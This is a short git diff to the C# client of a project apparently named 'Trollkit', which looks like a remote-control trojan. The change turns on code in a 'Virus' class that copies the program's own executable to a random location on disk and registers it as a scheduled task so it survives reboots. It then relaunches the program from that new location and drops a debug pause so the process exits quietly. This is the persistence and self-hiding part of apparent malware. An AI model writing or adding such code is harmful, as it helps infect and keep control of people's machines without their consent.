@@ -1,5 +1,6 @@
 ﻿using System;
 using System.Collections.Generic;
+using System.Diagnostics;
 using System.Net.Sockets;
 using System.Threading.Tasks;
 using Trollkit_Client.Modules;
@@ -41,13 +42,14 @@ namespace Trollkit_Client
 
 			Virus virus = new Virus();
 			string randomLocation = virus.FindRandomFileLocation();
-			//TODO: make sure the appliction is restarted with the right parameter.
-			string newFileLocation = "lekker";// virus.MoveFileToLocation(randomLocation);
+			string newFileLocation = virus.MoveFileToLocation(randomLocation);
 			BConsole.WriteLine($"New File location: {newFileLocation}");
 			new TaskSchedulerHelper().CreateTask(newFileLocation);
 
-			//TODO: after above is fixed remove this so the application closes itself
-			Console.Read();
+			Process.Start(newFileLocation, "move-completed");
+
+			//Enable below if you want to debug
+			//Console.Read();
 		}
 
 		public Program()
